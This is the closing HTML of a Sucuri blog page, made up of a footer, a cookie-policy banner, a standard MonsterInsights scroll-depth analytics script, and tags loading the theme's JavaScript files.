<p>&#x000A9;&nbsp;2022 Sucuri Inc. All rights reserved</p>
</div>
</div>
		</div></section>
</div></div></footer></div><script type="text/javascript">
ire('identify', {customerId: 'â€‹â€‹', customerEmail: 'â€‹â€‹'}); </script><div id="cookie-policy-banner" class="container-fluid cookie-policy-banner hide p-0">
        <div class="container">
            <button id="cookie-policy-decline-btn" class="cb-close cb-decline-anchor">X</button>
            <div class="row">
                <div class="c-lg-8">
                    <p class="mb-0 mt-0 highlight green heavy">Sucuri Cookie Policy <br> <a href="https://sucuri.net/cookies" target="_blank" class="bolder no-underline">See our policy>></a></p>
                    <p class="mb-0 mt-0">Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.</p>
                </div>
                <div class="c-lg-4 d-flex justify-items-start mt-15 align-items-center">
                    <button id="cookie-policy-btn" class="btn btn-primary ml-0">Accept</button>
                    <button class="btn cb-decline-anchor auto-track" data-gatrack="Cookie_Click, Decline">Decline</button>
                    <button id="manage-privacy-options" class="btn">Manage Options</button>
                </div>
            </div>
        </div>
    </div><script type="text/javascript">
		/* MonsterInsights Scroll Tracking */
			if ( typeof(jQuery) !== 'undefined' ) {
				jQuery( document ).ready(function(){
					function monsterinsights_scroll_tracking_load() {
						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
							(function(factory) {
								factory(jQuery);
							}(function($) {

								/* Scroll Depth */
								"use strict";
								var defaults = {
									percentage: true
								};

								var $window = $(window),
									cache = [],
									scrollEventBound = false,
									lastPixelDepth = 0;

								/*
								 * Plugin
								 */

								$.scrollDepth = function(options) {

									var startTime = +new Date();

									options = $.extend({}, defaults, options);

									/*
									 * Functions
									 */

									function sendEvent(action, label, scrollDistance, timing) {

										var fieldsArray = {
											hitType       : 'event',
											eventCategory : 'Scroll Depth',
											eventAction   : action,
											eventLabel    : label,
											eventValue    : 1,
											nonInteraction: 1
										};

										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
											return;
										}

										MonsterInsightsObject.sendEvent( fieldsArray );
										if (arguments.length > 3) {
											fieldsArray = {
												hitType        : 'timing',
												timingCategory : 'Scroll Depth',
												timingVar      : action,
												timingValue    : timing,
												timingLabel    : label,
												nonInteraction: 1
											};
											MonsterInsightsObject.sendEvent( fieldsArray );
										}
									}

									function calculateMarks(docHeight) {
										return {
											'25%' : parseInt(docHeight * 0.25, 10),
											'50%' : parseInt(docHeight * 0.50, 10),
											'75%' : parseInt(docHeight * 0.75, 10),
											/* Cushion to trigger 100% event in iOS */
											'100%': docHeight - 5
										};
									}

									function checkMarks(marks, scrollDistance, timing) {
										/* Check each active mark */
										$.each(marks, function(key, val) {
											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
												sendEvent('Percentage', key, scrollDistance, timing);
												cache.push(key);
											}
										});
									}

									function rounded(scrollDistance) {
										/* Returns String */
										return (Math.floor(scrollDistance/250) * 250).toString();
									}

									function init() {
										bindScrollDepth();
									}

									/*
									 * Public Methods
									 */

									/* Reset Scroll Depth with the originally initialized options */
									$.scrollDepth.reset = function() {
										cache = [];
										lastPixelDepth = 0;
										$window.off('scroll.scrollDepth');
										bindScrollDepth();
									};

									/* Add DOM elements to be tracked */
									$.scrollDepth.addElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.merge(options.elements, elems);

										/* If scroll event has been unbound from window, rebind */
										if (!scrollEventBound) {
											bindScrollDepth();
										}

									};

									/* Remove DOM elements currently tracked */
									$.scrollDepth.removeElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.each(elems, function(index, elem) {

											var inElementsArray = $.inArray(elem, options.elements);
											var inCacheArray = $.inArray(elem, cache);

											if (inElementsArray != -1) {
												options.elements.splice(inElementsArray, 1);
											}

											if (inCacheArray != -1) {
												cache.splice(inCacheArray, 1);
											}

										});

									};

									/*
									 * Throttle function borrowed from:
									 * Underscore.js 1.5.2
									 * http://underscorejs.org
									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
									 * Underscore may be freely distributed under the MIT license.
									 */

									function throttle(func, wait) {
										var context, args, result;
										var timeout = null;
										var previous = 0;
										var later = function() {
											previous = new Date;
											timeout = null;
											result = func.apply(context, args);
										};
										return function() {
											var now = new Date;
											if (!previous) previous = now;
											var remaining = wait - (now - previous);
											context = this;
											args = arguments;
											if (remaining <= 0) {
												clearTimeout(timeout);
												timeout = null;
												previous = now;
												result = func.apply(context, args);
											} else if (!timeout) {
												timeout = setTimeout(later, remaining);
											}
											return result;
										};
									}

									/*
									 * Scroll Event
									 */

									function bindScrollDepth() {

										scrollEventBound = true;

										$window.on('scroll.scrollDepth', throttle(function() {
											/*
											 * We calculate document and window height on each scroll event to
											 * account for dynamic DOM changes.
											 */

											var docHeight = $(document).height(),
												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
												scrollDistance = $window.scrollTop() + winHeight,

												/* Recalculate percentage marks */
												marks = calculateMarks(docHeight),

												/* Timing */
												timing = +new Date - startTime;

											checkMarks(marks, scrollDistance, timing);
										}, 500));

									}

									init();
								};

								/* UMD export */
								return $.scrollDepth;

							}));

							jQuery.scrollDepth();
						} else {
							setTimeout(monsterinsights_scroll_tracking_load, 200);
						}
					}
					monsterinsights_scroll_tracking_load();
				});
			}
		/* End MonsterInsights Scroll Tracking */
		
</script><script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/hoverIntent.min.js?ver=1.10.2' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.5' id='superfish-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=2.7.1' id='superfish-args-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=2.7.1' id='skip-links-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/theme.js?ver=1.1.0' id='sucuriblog-theme-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky.js?ver=1.0.4' id='sucuriblog-sticky-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky-init.js?ver=1.0.1' id='sucuriblog-sticky-js-init-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/cookie-banner.js?ver=20200914' id='cookie-banner-js-js'></script>
</body></html>
